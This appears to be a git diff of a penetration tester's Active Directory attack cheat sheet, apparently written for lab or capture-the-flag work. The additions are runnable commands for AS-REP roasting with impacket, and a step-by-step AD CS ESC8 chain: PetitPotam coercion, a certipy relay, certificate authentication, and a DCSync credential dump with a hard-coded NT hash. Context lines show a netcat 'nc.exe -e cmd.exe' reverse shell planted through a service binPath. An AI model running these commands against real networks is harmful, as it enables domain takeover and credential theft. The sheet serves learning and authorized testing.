@@ -37,6 +37,12 @@ hashcat:
 impacket-GetNPUsers corp.com/dave -dc-ip 192.168.114.70
 ```
 
+- with userfile option (when only usernames are known)
+
+```sh
+impacket-GetNPUsers shadow.gate/ -format hashcat -usersfile users.txt -request -dc-ip 10.0.26.64
+```
+
 hashcat: 
 
 `hashcat -m 18200 hash.txt /path/to/wordlist`
@@ -439,8 +445,8 @@ Admin priv accounts needed
 - local admin
 
 ```sh
-impacket-secretsdump marvel.local/fcastle:Password1@$IP (domain)
-impacket-secretsdump administrator:@$IP -hahes :$NT (local)
+impacket-secretsdump marvel.local/fcastle:Password1@$IP
+impacket-secretsdump administrator:@$IP -hahes :$NT
 ```
 
 - domain admin
@@ -604,6 +610,8 @@ sc.exe config VMTools binPath="C:\Users\svc-printer\Documents\nc.exe -e cmd.exe 
 
 `certipy-ad find -username 'BANKING$' -password 'Password1!' -dc-ip 10.129.2.242 -vulnerable -enable -stdout`
 
+- [Documents for ESC attacks](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation) 
+
 ### ESC1
 
 [ESC1 certipy doc](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation)
@@ -634,6 +642,42 @@ Would you like to save the private key? (y/N)
 4. Access with the created hash
 
 `impacket-psexec retro.vl/administrator@retro.vl -hashes :252fac7066d93dd009d4fd2cd0368389`
+
+### ESC8
+
+1. Add **DNS Name** to the /etc/hosts file
+
+2. Check which coerce tool is available (optional)
+
+```
+nxc smb 10.0.26.64 -u bbrown -p 12345678 -M coerce_plus
+```
+
+3. Certipy relay
+
+```bash
+certipy relay -target http://dc01.shadow.gate -template DomainController
+```
+
+4. Coerce (Force) DC to be involved
+
+```bash
+python3 ~/Tools/linux/PetitPotam/PetitPotam.py -u bbrown -p 12345678 $Kali_IP $Target_IP
+```
+
+5. `pfx` file is created. Certipy auth with the pfx file.
+
+```bash
+certipy auth -pfx dc01.pfx -dc-ip 10.0.26.64 
+```
+
+NTLM hash is displayed.
+
+6. DCsync with the hash
+
+```bash
+impacket-secretsdump dc01.shadow.gate/'dc01$':@10.0.26.64 -hashes :a45d38d93755902d4a85624ad14f0c4e
+```
 
 ## sudo
 
